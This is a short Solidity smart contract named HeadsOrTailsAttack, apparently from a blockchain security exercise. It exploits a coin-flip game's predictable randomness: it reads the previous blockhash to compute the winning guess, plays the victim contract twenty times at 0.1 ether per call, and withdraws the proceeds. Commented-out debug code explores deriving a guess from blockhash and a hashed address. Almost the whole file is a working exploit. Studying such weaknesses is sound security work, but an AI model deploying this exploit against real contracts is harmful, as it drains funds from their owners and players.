pragma solidity 0.4.24;


contract HeadsOrTailsAttack {

    function () external payable {

    }

    function attack(address _victim) external payable returns(bool) {
        bytes32 entropy = blockhash(block.number-1);
        bytes1 coinFlip = entropy[0] & 1;
        bool guess = (coinFlip == 0 ? false : true);
        HeadsOrTails victim = HeadsOrTails(_victim);

        uint i;
        while (i < 20) {
            victim.play.value(100000000000000000 wei)(guess);
            i++;
        }
    }

    function getBalance() external view returns(uint256) {
        return address(this).balance;
    }

    function withdraw() external {
        msg.sender.transfer(address(this).balance);
    }
}

// 10 szabo == 10000000000000 wei == 0.00001

// bytes32 public hash1;
// bytes32 public hashDEBUG; //should be == hash2
// bytes32 public unhashedTarget; //this is the number to use as guess!
// bytes32 public target;
// bytes32 public lastGuess;

// function getHash() public {
//     hash1 = blockhash(block.number); //0x00
//     hashDEBUG = keccak256(abi.encodePacked(0x971BF49495F4038144ba52024f7cF92D0ffc56AB));
//     target = keccak256(abi.encodePacked(hash1 ^ hashDEBUG));
//     unhashedTarget = hash1 ^ hashDEBUG; //this is the _myGuess value
// }

// function guess(uint256 _myGuess) public returns(bool) {
//     lastGuess = keccak256(abi.encodePacked(_myGuess));
//     return (lastGuess == target);
// }